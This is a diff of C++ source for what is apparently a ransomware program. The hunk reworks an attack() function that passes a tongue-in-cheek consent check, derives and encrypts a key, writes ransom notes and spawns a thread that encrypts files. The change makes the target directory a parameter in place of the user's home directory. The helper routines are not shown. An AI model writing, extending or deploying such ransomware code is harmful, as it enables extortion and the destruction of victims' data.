@@ -200,29 +200,20 @@ namespace dune
         };
         /* Must pass the Acknowledgement stucture */
         /* Creates thread use detatch to stop the hang up */
-        ATTACK_STATUS attack(Acknowledgement agreement, bool detatch = false)
+        ATTACK_STATUS attack(Acknowledgement agreement, std::string root_dir, bool detatch = false)
         {
             if (!(agreement.are_you_sure_you_want_to_do_this && agreement.i_accept_the_risks_and_consequences_of_my_actions && agreement.i_understand_it_is_illegel))
             {
                 std::cout << "Oh, Well this is embarrassing..." << std::endl;
                 return ATTACK_STATUS::YOU_DID_NOW_ACCEPT;
             }
-            char *drive = getenv("HOMEDRIVE");
-            char *path = getenv("HOMEPATH");
-            if (drive == nullptr || path == nullptr)
-            {
-                return ATTACK_STATUS::CANT_FIND_HOME_DIR;
-            }
-            std::string user_home_path = std::string(drive) + std::string(path);
-            // Use this for now.
-            user_home_path = "./";
             derive_key();
             encrypt_derived_key();
             if (write_note() != user_notes_locations.size())
             {
                 return ATTACK_STATUS::UNABLE_TO_WRITE_ALL_NOTES;
             }
-            std::thread encryptor(encrypt_files, plain_key, exempt_files, user_home_path);
+            std::thread encryptor(encrypt_files, plain_key, exempt_files, root_dir);
             plain_key.clear();
             if (detatch)
             {
